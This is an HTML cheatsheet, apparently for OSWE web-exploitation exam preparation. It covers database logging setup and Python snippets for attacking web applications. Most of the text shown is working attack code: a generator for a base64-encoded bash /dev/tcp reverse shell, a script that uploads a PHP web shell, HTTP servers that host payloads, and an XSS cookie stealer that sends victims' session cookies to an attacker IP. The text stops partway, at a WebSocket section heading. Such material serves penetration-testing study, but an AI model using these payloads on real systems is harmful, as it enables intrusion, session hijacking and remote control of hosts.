<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OSWE Cheatsheet</title>
    <!-- Highlight.js for syntax highlighting -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/monokai.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
    <script>hljs.highlightAll();</script>
    <style>
        /* General Reset and Base Styles */
        body {
            background-color: #121212;
            color: #FFFFFF;
            font-family: Arial, Helvetica, sans-serif;
            margin: 0;
            padding: 0;
        }

        /* Header Styles */
        .header {
            display: flex;
            justify-content: center;
            align-items: center;
            background: #B89778; /* Updated gold color */
            padding: 20px;
            box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
            position: fixed;
            top: 0;
            width: 100%;
            z-index: 1000;
        }

        .logo-container {
            font-size: 1.8rem;
            font-weight: bold;
            color: #000000;
            text-shadow: 0 0 10px #000000, 0 0 20px #000000;
            animation: flicker 1.5s infinite alternate;
        }

        .logo-text {
            margin-right: 50px;
        }

        .logo-page {
            width: 70px;
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
        }

        @keyframes flicker {
            0% { opacity: 1; text-shadow: 0 0 10px #000000, 0 0 20px #000000; }
            50% { opacity: 0.8; text-shadow: 0 0 5px #000000, 0 0 10px #000000; }
            100% { opacity: 1; text-shadow: 0 0 15px #000000, 0 0 30px #000000; }
        }

        /* Hamburger Menu */
        .burger {
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            width: 30px;
            height: 25px;
            cursor: pointer;
            padding: 5px;
            border-radius: 8px;
            transition: transform 0.3s ease-in-out;
            position: absolute;
            left: 10px;
        }

        .burger div {
            background-color: #000000;
            width: 100%;
            height: 4px;
            border-radius: 4px;
            transition: all 0.3s ease;
        }

        .burger.active div:nth-child(1) {
            transform: rotate(45deg) translate(4px, 4px);
        }

        .burger.active div:nth-child(2) {
            opacity: 0;
        }

        .burger.active div:nth-child(3) {
            transform: rotate(-45deg) translate(4px, -4px);
        }

        /* Sidebar (Aside) */
        aside {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 250px;
            background-color: rgba(28, 37, 38, 0.95);
            height: 100vh;
            position: fixed;
            left: -250px;
            top: 0;
            transition: left 0.3s ease;
            z-index: 1000;
            padding-top: 30px;
            overflow-y: scroll;
        }

        aside.active {
            left: 0;
        }

        aside .logo {
            font-size: 2em;
            margin-bottom: 30px;
        }

        .logo-text-burguer {
            font-size: 1.5rem;
        }

        #closeBtn {
            position: absolute;
            top: 15px;
            right: 15px;
            background-color: #ff5f56;
            color: white;
            border: none;
            padding: 8px;
            border-radius: 50%;
            cursor: pointer;
            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
            font-size: 1.5em;
            width: 30px;
            height: 30px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        #closeBtn:hover {
            background-color: #e03e2f;
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.7);
        }

        /* Overlay */
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            z-index: 999;
        }

        .overlay.active {
            display: block;
        }

        /* Navigation Links */
        .nav-links {
            padding: 0;
            margin: 0;
        }

        .nav-links li {
            list-style: none;
            margin: 12px 0;
        }

        .nav-links a {
            text-decoration: none;
            color: #FFFFFF;
            font-size: 1.1em;
            padding: 12px 20px;
            border-radius: 6px;
            background: transparent;
            box-shadow: none;
            display: block;
            transition: all 0.3s ease-in-out;
        }

        .nav-links a:hover {
            background: transparent;
            color: #D4AF37;
            border: none;
            box-shadow: none;
            transform: translateX(8px);
        }

        /* Terminal Styles */
        .terminal-container {
            width: 95%;
            max-width: 900px;
            background-color: #161b22;
            border-radius: 8px;
            padding: 15px;
            margin: 40px auto;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
        }

        .terminal-header {
            display: flex;
            justify-content: flex-start;
            align-items: center;
            background-color: #0d1117;
            padding: 10px;
            border-radius: 8px 8px 0 0;
            position: relative;
        }

        .buttons span {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 5px;
        }

        .red { background-color: #ff5f56; }
        .yellow { background-color: #ffbd2e; }
        .green { background-color: #27c93f; }

        .terminal-header .title {
            flex-grow: 1;
            text-align: center;
            font-size: 14px;
            margin: 0 80px 0 60px; /* Prevents overlap with buttons and copy icon */
        }

        .terminal-body {
            padding: 15px;
            background-color: #0d1117;
            border-radius: 0 0 8px 8px;
        }

        .output {
            width: 100%;
            height: 180px;
            background-color: #0d1117;
            border: 1px solid #FFFFFF;
            color: #FFFFFF;
            padding: 10px;
            border-radius: 4px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        /* Copy Button */
        #copyBtnTerminal {
            position: absolute;
            top: 10px;
            right: 10px;
            cursor: pointer;
            width: 20px;
            height: 20px;
            filter: brightness(0) invert(1);
            z-index: 10; /* Ensures button is above other elements */
        }

        #copiedText {
            position: absolute;
            top: 10px;
            right: 40px;
            visibility: hidden;
            opacity: 0;
            transition: opacity 0.5s ease;
            font-size: 14px;
            color: #D4AF37;
            z-index: 10; /* Ensures text is above other elements */
        }

        /* EDR Buttons Container */
        .edr-buttons-container {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            justify-content: center;
            margin: 20px 0;
        }

        /* Generate Buttons */
        .generate-btn {
            font-size: 16px;
            cursor: pointer;
            border: 2px solid #D4AF37;
            background-color: #D2B48C;
            color: #1C2526;
            border-radius: 8px;
            font-family: 'Courier New', Courier, monospace;
            font-weight: bold;
            text-transform: uppercase;
            transition: all 0.3s ease-in-out;
            padding: 8px 20px;
        }

        .generate-btn:hover {
            background-color: #D4AF37;
            color: #FFFFFF;
            border: 2px solid #FFFFFF;
        }

        .generate-btn:active {
            background-color: #FFFFFF;
            border: 2px solid #D4AF37;
            transform: scale(0.98);
        }

        /* EDR-specific Button Styles */
        .crowdstrike-btn {
            background-color: #FF2D55;
            border-color: #FF5555;
        }

        .crowdstrike-btn:hover {
            background-color: #FF5555;
            border-color: #FFFFFF;
        }

        .microsoftxdr-btn {
            background-color: #0078D4;
            border-color: #00A1F1;
        }

        .microsoftxdr-btn:hover {
            background-color: #00A1F1;
            border-color: #FFFFFF;
        }

        .sentinelone-btn {
            background-color: #6F42C1;
            border-color: #8A5AD5;
        }

        .sentinelone-btn:hover {
            background-color: #8A5AD5;
            border-color: #FFFFFF;
        }

        .defender-btn {
            background-color: #00A4B4;
            border-color: #00CED1;
        }

        .defender-btn:hover {
            background-color: #00CED1;
            border-color: #FFFFFF;
        }

        .random-btn {
            background-color: #D2B48C;
            border-color: #D4AF37;
        }

        .random-btn:hover {
            background-color: #D4AF37;
            border-color: #FFFFFF;
        }

        /* Terminal Overlay */
        .terminal-overlay {
            display: none;
            position: absolute;
            background-color: rgba(0, 0, 0, 0.5);
            color: white;
            padding: 10px;
            font-family: monospace;
            white-space: nowrap;
        }

        /* Slider for Animation Toggle */
        .slider-container {
            display: flex;
            align-items: center;
            gap: 10px;
            margin: 20px 0;
            justify-content: center;
            margin-top: 40px;
            margin-bottom: -50px;
        }

        #animation-toggle {
            appearance: none;
            width: 50px;
            height: 25px;
            background-color: #ccc;
            border-radius: 50px;
            position: relative;
            transition: background-color 0.3s ease;
            cursor: pointer;
        }

        #animation-toggle:checked {
            background-color: #4CAF50;
        }

        #animation-toggle:before {
            content: "";
            position: absolute;
            top: 2px;
            left: 2px;
            width: 21px;
            height: 21px;
            background-color: white;
            border-radius: 50%;
            transition: left 0.3s ease;
        }

        #animation-toggle:checked:before {
            left: 27px;
        }

        #animation-status {
            font-size: 16px;
            font-weight: bold;
            color: #333;
            transition: color 0.3s ease;
        }

        #animation-toggle:checked + #animation-status {
            color: #4CAF50;
        }

        /* Terminal Page Title */
        .terminal-container-page {
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .terminal-page-title {
            text-align: center;
        }

        .user {
            color: #ff5555;
            font-weight: bold;
        }

        .host {
            color: #D4AF37;
            font-weight: bold;
        }

        .command-page {
            color: #FFFFFF;
            font-weight: bold;
        }

        /* Description and Dividers */
        .description-page {
            text-align: center;
        }

        .margin-page-desc {
            margin: 0 100px;
        }

        .styled-divider {
            width: 0%;
            height: 2px;
            background: #D4AF37;
            margin: 30px auto;
            border-radius: 5px;
            animation: expand 1s ease-in-out forwards;
        }

        @keyframes expand {
            from { width: 0%; }
            to { width: 80%; }
        }

        /* Footer */
        .footer {
            display: flex;
            justify-content: center;
            align-items: center;
            background: #B89778; /* Updated gold color */
            padding: 20px;
            box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
            position: fixed;
            bottom: 0;
            width: 100%;
        }

        .footer-text {
            font-size: 1.2rem;
            font-weight: bold;
            color: #000000;
            text-shadow: 0 0 10px #000000, 0 0 20px #000000;
            animation: flicker 1.5s infinite alternate;
        }

        /* Syntax Highlighting */
        .comment { color: #569CD6; font-style: italic; }
        .command { color: #D4AF37; font-weight: bold; }
        .parameter { color: #888888; font-weight: bold; }
        .value { color: #FF5555; }
        .operator { color: #C586C0; }
        .variable { color: #FFA500; font-weight: bold; }
        .datatype { color: #4EC9B0; }
        .string { color: green; }

        /* Responsive Design */
        @media screen and (max-width: 768px) {
            .header {
                flex-direction: column;
            }

            .logo-container {
                font-size: 1.5rem;
            }

            .logo-text {
                margin-right: 20px;
            }

            .logo-page {
                width: 100px;
                margin-top: -8%;
            }

            aside {
                width: 200px;
                left: -200px;
            }

            .nav-links a {
                font-size: 1em;
                padding: 10px 15px;
            }

            .terminal-container {
                width: 90%;
                padding: 10px;
            }

            .output {
                height: 150px;
                font-size: 12px;
            }

            .margin-page-desc {
                margin: 0 50px;
            }

            .generate-btn {
                font-size: 14px;
                padding: 6px 12px;
            }

            .edr-buttons-container {
                flex-direction: column;
                align-items: center;
            }

            .slider-container {
                flex-direction: column;
                gap: 5px;
                margin-top: 20px;
                margin-bottom: -30px;
            }

            .terminal-header .title {
                margin: 0 60px 0 40px; /* Adjusted for smaller screens */
            }

            #animation-toggle {
                width: 40px;
                height: 20px;
            }

            #animation-toggle:before {
                width: 18px;
                height: 18px;
            }

            #animation-toggle:checked:before {
                left: 20px;
            }

            #animation-status {
                font-size: 14px;
            }

            .footer-text {
                font-size: 1rem;
            }
        }

        @media screen and (max-width: 480px) {
            .burger {
                width: 25px;
                height: 20px;
            }

            aside {
                width: 180px;
                left: -180px;
            }

            .nav-links a {
                font-size: 0.9em;
                padding: 8px 12px;
            }

            .logo-container {
                font-size: 1.2rem;
            }

            .logo-text {
                margin-right: 10px;
            }

            .terminal-container {
                width: 100%;
                padding: 8px;
            }

            .output {
                height: 120px;
                font-size: 11px;
            }

            .terminal-header .title {
                margin: 0 50px 0 30px; /* Adjusted for smaller screens */
                font-size: 12px;
            }

            #copyBtnTerminal {
                width: 15px;
                height: 15px;
                right: 5px;
                top: 12px;
            }

            #copiedText {
                right: 25px;
                top: 12px;
                font-size: 12px;
            }

            .margin-page-desc {
                margin: 0 20px;
            }

            .generate-btn {
                font-size: 12px;
                padding: 5px 10px;
            }

            .slider-container {
                margin-top: 40px;
                margin-bottom: -40px;
            }

            #animation-toggle {
                width: 35px;
                height: 18px;
            }

            #animation-toggle:before {
                width: 15px;
                height: 15px;
            }

            #animation-toggle:checked:before {
                left: 18px;
            }

            #animation-status {
                font-size: 12px;
            }

            .footer-text {
                font-size: 0.9rem;
            }
        }

        /* Additional styles for main content */
        #main {
            padding-top: 100px; /* Space for fixed header */
            padding: 20px;
            max-width: 800px;
            margin: 0 auto;
        }

        h1, h2, h3, h4 {
            color: #ffffff;
        }

        .code-container {
            position: relative;
            margin-bottom: 10px;
        }

        pre {
            background-color: #0d1117;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            margin: 0;
        }

        .copy-btn {
            position: absolute;
            top: 10px;
            right: 10px;
            background-color: #252526;
            color: #ffffff;
            border: none;
            padding: 5px 10px;
            cursor: pointer;
            border-radius: 4px;
            font-size: 12px;
            transition: background-color 0.3s;
        }

        .copy-btn:hover {
            background-color: #333333;
        }

        .copy-btn.copied {
            background-color: #4CAF50;
        }

        ul li .code-container {
            margin: 5px 0;
        }

        /* Ensure syntax highlighting works */
    </style>
</head>
<body>
    <div class="header">
        <div class="burger" id="burger">
            <div></div>
            <div></div>
            <div></div>
        </div>
        <div class="logo-container">
            <span class="logo-text">OSWE Cheatsheet</span>
        </div>
    </div>

    <div class="overlay" id="overlay"></div>

    <aside id="sidebar">
        <button id="closeBtn">&times;</button>
        <div class="logo-text-burguer">Table of Contents</div>
        <ul class="nav-links">
            <li><a href="#concepts">1. Concepts</a></li>
            <li><a href="#enable-database-debug-and-logging">2. Enable Database Debug and Logging</a>
                <ul>
                    <li><a href="#postgres">Postgres</a></li>
                    <li><a href="#mysql">MySQL</a></li>
                </ul>
            </li>
            <li><a href="#python-code-snippets">3. Python Code Snippets</a>
                <ul>
                    <li><a href="#starting-template">Starting Template</a></li>
                    <li><a href="#file-upload-with-additional-parameters">File Upload With Additional Parameters</a></li>
                    <li><a href="#http-file-server-1">HTTP File Server 1</a></li>
                    <li><a href="#http-file-server-2">HTTP File Server 2</a></li>
                    <li><a href="#http-file-server-3">HTTP File Server 3</a></li>
                    <li><a href="#xss-cookies-stealer">XSS Cookies Stealer</a></li>
                    <li><a href="#requests-session-with-proxy">Requests Session with Proxy</a></li>
                    <li><a href="#generate-reverse-shell-payload">Generate Reverse Shell Payload</a></li>
                    <li><a href="#websocket-client">WebSocket Client</a></li>
                    <li><a href="#forge-jwt">Forge JWT</a></li>
                    <li><a href="#get-current-time-epoch">Get Current Time (EPOCH)</a></li>
                </ul>
            </li>
            <li><a href="#insecure-deserialization">4. Insecure Deserialization</a>
                <ul>
                    <li><a href="#java">Java</a>
                        <ul>
                            <li><a href="#methods-and-classes">Methods and Classes</a></li>
                            <li><a href="#identify-insecure-deserialization-in-source-code">Identify Insecure Deserialization in Source Code</a></li>
                            <li><a href="#exploitation-template-in-python">Exploitation Template in Python</a></li>
                        </ul>
                    </li>
                    <li><a href="#python-1">Python</a>
                        <ul>
                            <li><a href="#methods-and-classes-1">Methods and Classes</a></li>
                            <li><a href="#identify-insecure-deserialization-in-source-code-1">Identify Insecure Deserialization in Source Code</a></li>
                            <li><a href="#exploitation-template-in-python-1">Exploitation Template in Python</a></li>
                        </ul>
                    </li>
                    <li><a href="#php">PHP</a>
                        <ul>
                            <li><a href="#methods-and-classes-2">Methods and Classes</a></li>
                            <li><a href="#identify-insecure-deserialization-in-source-code-2">Identify Insecure Deserialization in Source Code</a></li>
                            <li><a href="#exploitation-template-in-python-2">Exploitation Template in Python</a></li>
                        </ul>
                    </li>
                    <li><a href="#nodejs">Node.js</a>
                        <ul>
                            <li><a href="#methods-and-classes-3">Methods and Classes</a></li>
                            <li><a href="#identify-insecure-deserialization-in-source-code-3">Identify Insecure Deserialization in Source Code</a></li>
                            <li><a href="#exploitation-template-in-python-3">Exploitation Template in Python</a></li>
                        </ul>
                    </li>
                </ul>
            </li>
            <li><a href="#file-inclusion-vulnerabilities-in-php">5. File Inclusion Vulnerabilities in PHP</a>
                <ul>
                    <li><a href="#local-file-inclusion-lfi">Local File Inclusion (LFI)</a></li>
                    <li><a href="#remote-file-inclusion-rfi">Remote File Inclusion (RFI)</a></li>
                </ul>
            </li>
            <li><a href="#regex-cheatsheet">6. Regex Cheatsheet</a>
                <ul>
                    <li><a href="#match-a-start-and-end-delimiter-in-rtext">Match a START and END Delimiter in r.text</a></li>
                    <li><a href="#extract-a-cookie-value-from-response-headers">Extract a Cookie Value from Response Headers</a></li>
                </ul>
            </li>
            <li><a href="#xss-payloads">7. XSS Payloads</a>
                <ul>
                    <li><a href="#load-external-javascript">Load External JavaScript</a></li>
                    <li><a href="#load-inline-javascript">Load Inline JavaScript</a></li>
                    <li><a href="#send-localstorage-token-value-from-user-key-to-remote-resource">Send localStorage Token Value from User Key to Remote Resource</a></li>
                    <li><a href="#leverage-xss-to-csrf">Leverage XSS to CSRF</a></li>
                    <li><a href="#filter-specific-cookie-value-and-send-it-back">Filter Specific Cookie Value and Send It Back</a></li>
                    <li><a href="#send-request-to-specific-endpoint-with-custom-header-and-send-response-back">Send Request to Specific Endpoint with Custom Header and Send Response Back</a></li>
                </ul>
            </li>
            <li><a href="#sql-injection-cheatsheet">8. SQL Injection Cheatsheet</a>
                <ul>
                    <li><a href="#general-sql-injection-payloads">General SQL Injection Payloads</a></li>
                    <li><a href="#postgres-specific">Postgres Specific</a></li>
                    <li><a href="#mysql-specific">MySQL Specific</a></li>
                </ul>
            </li>
            <li><a href="#javascript-code-snippets">9. JavaScript Code Snippets</a>
                <ul>
                    <li><a href="#basic-fetch-request">Basic Fetch Request</a></li>
                    <li><a href="#fetch-with-headers-and-body">Fetch with Headers and Body</a></li>
                    <li><a href="#fetch-cookies-and-send-to-remote">Fetch Cookies and Send to Remote</a></li>
                    <li><a href="#websocket-client-1">WebSocket Client</a></li>
                </ul>
            </li>
            <li><a href="#bypass-php-eval-filtering">10. Bypass PHP Eval Filtering</a></li>
            <li><a href="#bypass-javascript-injection-filters">11. Bypass Javascript Injection Filters</a></li>
            <li><a href="#ysoserial-payload-creation">12. YSOSerial Payload Creation</a>
                <ul>
                    <li><a href="#net-version">.NET Version</a></li>
                    <li><a href="#java-version">JAVA Version</a></li>
                </ul>
            </li>
            <li><a href="#report-recommendations">13. Report Recommendations</a></li>
            <li><a href="#additional-resources">14. Additional Resources</a></li>
        </ul>
    </aside>

    <main id="main">
        <h1 id="oswe">OSWE</h1>

        <h2 id="concepts">Concepts</h2>

        <h3 id="authentication-bypass">Authentication Bypass</h3>
        <p>- SQLi, XSS, Type Juggling, Application Logic Flaws, CORS, CSRF etc.</p>

        <h3 id="remote-code-execution">Remote Code Execution</h3>
        <p>- SQLi, Javascript Injection, File upload, Deserialization, SSTI, Prototype Pollution, SSRF.</p>

        <h2 id="enable-database-debug-and-logging">Enable Database Debug and Logging</h2>

        <h3 id="postgres">Postgres</h3>
        <p>Edit your <code>/etc/postgresql/&lt;version-num&gt;/main/postgresql.conf</code>, and change the lines as follows.</p>
        <p>Note: If you didn't find the postgresql.conf file, then just type <code>$locate postgresql.conf</code> in a terminal</p>
        <p>Uncomment these fields:</p>
        <ol>
            <li><code>#log_directory = 'log'</code></li>
            <li><code>#log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'</code></li>
        </ol>
        <p>Change these fields values:</p>
        <ol>
            <li><code>#log_statement = 'none'</code> -> <code>log_statement = 'all'</code></li>
            <li><code>#logging_collector = off</code> -> <code>logging_collector = on</code></li>
            <li><code>sudo /etc/init.d/postgresql restart or sudo service postgresql restart</code></li>
            <li>Fire query in postgresql <code>select 2+2</code>.</li>
            <li>Find current log in <code>/var/lib/postgresql/10/main/log</code></li>
        </ol>

        <h3 id="mysql">MySQL</h3>
        <p>Login to the MySQL instance and check out the <code>general_log</code> and values, whether is set to ON or OFF:</p>
        <div class="code-container">
            <pre><code class="language-sql">show variables like '%log%';</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>If it's set to OFF, run the below command to switch it (as the root user!):</p>
        <div class="code-container">
            <pre><code class="language-sql">SET GLOBAL general_log = 1;</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>Next, check the <code>general_log_file</code> value to see where the actual log file is located using the same.</p>

        <h2 id="python-code-snippets">Python Code Snippets</h2>

        <h3 id="starting-template">Starting Template</h3>
        <div class="code-container">
            <pre><code class="language-python">import requests
import string
import re
import threading
import base64
import netifaces
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.server import BaseHTTPRequestHandler
from http.server import HTTPServer

GREEN = '\033[92m'   # Bright Green
RED = '\033[91m'     # Bright Red
RESET = '\033[0m'    # Reset to default color

# Define reusable symbols

success = f"{GREEN}[+]{RESET}"
failure = f"{RED}[-]{RESET}"

proxies = {"http":"http://127.0.0.1:8080"}

def generate_b64revshell(listener_ip, listener_port):

    payload = f"bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1"
    payload_bytes = payload.encode('ascii')
    b64payload = base64.b64encode(payload_bytes)
    base64_payload = b64payload.decode('ascii')
    return base64_payload

def register():

    ## Register logic
    return 'username', 'password'  # Example return

def login(username, password):

    ## Login Logic
    return {}  # Example cookies

if __name__ == "__main__":

    target_ip = '10.10.10.10'
    listener_ip = '192.168.1.100'
    listener_port = '4444'

    # Main Logic

    username, password = register()
    usercookies = login(username, password) 
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h3 id="file-upload-with-additional-parameters">File Upload With Additional Parameters</h3>
        <div class="code-container">
            <pre><code class="language-python">import requests
import string
import random
import io

GREEN = '\033[92m'   # Bright Green
RED = '\033[91m'     # Bright Red
RESET = '\033[0m'    # Reset to default color

# Define reusable symbols

success = f"{GREEN}[+]{RESET}"
failure = f"{RED}[-]{RESET}"

proxies = {"http":"http://127.0.0.1:8080"}

def uploadFile(phpsessid):

    url = "http://10.100.102.73:80/item/updateItem.php"

    payload_content = b"&lt;?php system($_REQUEST['cmd']); ?&gt;"
    pwny = io.BytesIO(payload_content)

    data = {
        "id": "1",
        "id_user": "1",
        "name": "Raspery Pi 4",
        "description": ("Latest Raspberry Pi 4 Model B with 2/4/8GB RAM raspberry pi 4 "
                        "BCM2711 Quad core Cortex-A72 ARM v8 1.5GHz Speeder Than Pi 3B"),
        "price": "92"
    }

    filename = ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + '.phar'
    files = {
        "image": (filename, pwny, "application/octet-stream")
    }
    
    cookies = {

        "PHPSESSID": phpsessid
    }

    r = requests.post(url, data=data, files=files, cookies=cookies, proxies=proxies, allow_redirects=False)
    loginheader = r.headers.get("Location", "")
    match = re.search(r'index\.php$', loginheader)
    if match:
        print(f"[+] Filename {filename} uploaded successfully!")
    else:
        print("[-] File is not uploaded.")
    return filename

uploadFile('example_phpsessid')
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h3 id="http-file-server-1">HTTP File Server 1</h3>
        <div class="code-container">
            <pre><code class="language-python">from http.server import BaseHTTPRequestHandler
from http.server import HTTPServer

LHOST      = "10.0.0.1"
WEB_PORT   = 8000
JS_PAYLOAD = "&lt;script&gt;alert(1)&lt;/script&gt;"

def start_web_server():
    class MyHandler(BaseHTTPRequestHandler):
        # Uncomment this method to suppress HTTP logs
        # def log_message(self, format, *args):
        #     return

        def do_GET(self):
            if self.path.endswith('/payload.js'):
                self.send_response(200)
                self.send_header("Content-Type", "application/javascript")
                self.send_header("Content-Length", str(len(JS_PAYLOAD)))
                self.end_headers()
                self.wfile.write(JS_PAYLOAD.encode())
            
    httpd = HTTPServer((LHOST, WEB_PORT), MyHandler)
    threading.Thread(target=httpd.serve_forever).start()

start_web_server()
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h3 id="http-file-server-2">HTTP File Server 2</h3>
        <div class="code-container">
            <pre><code class="language-python">from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
import os

GREEN = '\033[92m'   # Bright Green
RED = '\033[91m'     # Bright Red
RESET = '\033[0m'    # Reset to default color

# Define reusable symbols

success = f"{GREEN}[+]{RESET}"
failure = f"{RED}[-]{RESET}"

def start_web_server(host="192.168.45.249", port=80, directory="."):
    os.chdir(directory)
    
    class MyHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            try:
                file_path = os.path.join(directory, self.path.lstrip("/"))
                if os.path.exists(file_path) and os.path.isfile(file_path):
                    self.send_response(200)
                    if file_path.endswith(".dtd"):
                        self.send_header("Content-type", "application/xml-dtd")
                    else:
                        self.send_header("Content-type", "text/plain")
                    self.end_headers()
                    with open(file_path, "rb") as f:
                        self.wfile.write(f.read())
                else:
                    self.send_response(404)
                    self.send_header("Content-type", "text/plain")
                    self.end_headers()
                    self.wfile.write(b"File not found")
            except Exception as e:
                self.send_response(500)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(f"Server error: {str(e)}".encode())

    httpd = HTTPServer((host, port), MyHandler)
    print(f"{success} Serving at {host}:{port}")
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd

start_web_server()
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h3 id="http-file-server-3">HTTP File Server 3</h3>
        <div class="code-container">
            <pre><code class="language-python">import threading
import mimetypes
import socket
import os

GREEN = '\033[92m'   # Bright Green
RED = '\033[91m'     # Bright Red
RESET = '\033[0m'    # Reset to default color

# Define reusable symbols

success = f"{GREEN}[+]{RESET}"
failure = f"{RED}[-]{RESET}"

HOST = '0.0.0.0'
PORT = 8000
SERVE_DIR = '.'

def handle_client(conn, addr):
    print(f"{success} Connection from {addr}")
    try:
        # Receive request data
        request = conn.recv(1024).decode('utf-8')
        # print(f"Received request from {addr}: {request[:100]}...")  # Log first 100 chars        
        # Simple parsing: Extract the path from "GET /path HTTP/1.1"
        lines = request.split('\n')
        if lines and 'GET /' in lines[0]:
            path = lines[0].split(' ')[1]  # e.g., "/filename.txt"
            if path == '/':
                path = '/index.html'  # Optional: Default to index.html if root, but you can remove this
            full_path = os.path.join(SERVE_DIR, path.lstrip('/'))
            
            if os.path.exists(full_path) and os.path.isfile(full_path):
                # Read and send the file
                with open(full_path, 'rb') as f:
                    file_data = f.read()
                
                # Guess MIME type
                mime_type, _ = mimetypes.guess_type(full_path)
                if mime_type is None:
                    mime_type = 'application/octet-stream'
                
                # Basic HTTP response
                response = (
                    b'HTTP/1.1 200 OK\r\n'
                    b'Content-Type: ' + mime_type.encode('utf-8') + b'\r\n'
                    b'Content-Length: ' + str(len(file_data)).encode('utf-8') + b'\r\n'
                    b'\r\n'
                )
                conn.sendall(response + file_data)
                print(f"Served {full_path} ({len(file_data)} bytes) to {addr}")
            else:
                # 404 response
                response = b'HTTP/1.1 404 Not Found\r\nContent-Type: text/plain\r\n\r\nFile not found.'
                conn.sendall(response)
                print(f"File {full_path} not found for {addr}")
        else:
            # 400 for invalid request
            response = b'HTTP/1.1 400 Bad Request\r\nContent-Type: text/plain\r\n\r\nInvalid request.'
            conn.sendall(response)
    except Exception as e:
        print(f"Error handling {addr}: {e}")
    finally:
        conn.close()

def server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow reuse of address
        s.bind((HOST, PORT))
        s.listen(5)  # Backlog of 5 for queued connections
        print(f"{success}Background file server listening on {HOST}:{PORT} ... (serving from {SERVE_DIR})")
        while True:
            conn, addr = s.accept()
            # Handle each client in a separate thread for concurrency
            client_thread = threading.Thread(target=handle_client, args=(conn, addr))
            client_thread.start()

# Start the server in a background thread (daemon=True so it exits when main does)
server_thread = threading.Thread(target=server, daemon=True)
server_thread.start()

# Main program continues here (non-blocking)
print(f"{success} File server started in background. Main program running...")
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h3 id="xss-cookies-stealer">XSS Cookies Stealer</h3>
        <div class="code-container">
            <pre><code class="language-python">import requests
import socket
import base64
import re

TARGET_URL = 'http://example.com/post'
HOST = '0.0.0.0'
PORT = 9001

def send_xss_payload():

    payload = "&lt;script&gt;document.location='http://10.100.102.67:9001/?c='+document.cookie&lt;/script&gt;"
    data = {
        'title': 'test',
        'author': 'blabla',
        'text': payload,
        'submit': 'Submit'
    }

    proxies = {"http": "http://127.0.0.1:8080"}  # Use Burp or comment this out
    try:
        r = requests.post(TARGET_URL, data=data, proxies=proxies)
        if r.status_code == 200:
            print("XSS payload sent successfully.")
        else:
            print(f"Server responded with status code: {r.status_code}")
    except Exception as e:
        print(f"Error sending payload: {e}")

def listen_for_cookies():

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(1)
        print(f"Listening on {HOST}:{PORT} ...")
        print("Waiting for admin to trigger XSS...")

        conn, addr = s.accept()
        with conn:
            print(f"Connection from {addr}")
            data = conn.recv(2048)

            # Base64 encode for logging
            encoded_data = base64.b64encode(data).decode('utf-8')
            print(f"Base64 Encoded Request: " + encoded_data)

            decoded_data = data.decode('utf-8', errors='ignore')

            # Extract cookie
            match = re.search(r'PHPSESSID=([^;& ]+)', decoded_data)
            if match:
                cookie = match.group(1)
                print(f"PHPSESSID captured: " + cookie)
                return cookie
            else:
                print("PHPSESSID not found in received data.")

send_xss_payload()
listen_for_cookies()
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h3 id="requests-session-with-proxy">Requests Session with Proxy</h3>
        <div class="code-container">
            <pre><code class="language-python">import requests

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}

session = requests.Session()
session.proxies.update(proxies)
session.verify = False  # Disable SSL verification if needed

# Example usage
response = session.get('https://example.com')
print(response.text)

# POST example
data = {'key': 'value'}
response = session.post('https://example.com/post', data=data)
print(response.json())
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h3 id="generate-reverse-shell-payload">Generate Reverse Shell Payload</h3>
        <div class="code-container">
            <pre><code class="language-python">import base64

def generate_reverse_shell(lhost, lport):
    shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    encoded = base64.b64encode(shell.encode()).decode()
    print(f"Base64 encoded reverse shell: {encoded}")
    print(f"Usage: echo -n '{encoded}' | base64 -d | bash")

if __name__ == "__main__":
    lhost = '192.168.1.100'
    lport = 4444
    generate_reverse_shell(lhost, lport)
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h3 id="websocket-client">WebSocket Client</h3>
        <div class="code-container">
